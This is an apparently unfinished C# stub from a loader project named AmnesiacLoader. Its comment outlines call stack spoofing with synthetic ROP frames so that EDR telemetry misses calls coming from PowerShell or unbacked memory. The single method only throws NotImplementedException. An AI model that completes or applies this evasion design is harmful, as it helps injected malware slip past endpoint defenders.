// AmnesiacLoader — Call Stack Spoofing
// Inserts synthetic ROP frames before syscall dispatch so EDR telemetry sees a
// legitimate-looking call chain (ntdll -> kernelbase -> kernel32) rather than
// a call originating from a PowerShell scriptblock or unbacked memory region.
//
// Implementation: [PLANNED — see design spec]
// - Locate ROP gadgets within ntdll.dll and kernelbase.dll at runtime
// - Build synthetic frame list on the stack before NtXxx dispatch
// - Restore real stack after syscall returns

using System;

namespace AmnesiacLoader
{
    public class CallStack
    {
        // Build synthetic call frames before a syscall.
        // Called internally by Injector — not intended for direct use from PowerShell.
        internal static void SpoofFrames()
        {
            throw new NotImplementedException("AmnesiacLoader.CallStack not yet implemented — see design spec.");
        }
    }
}
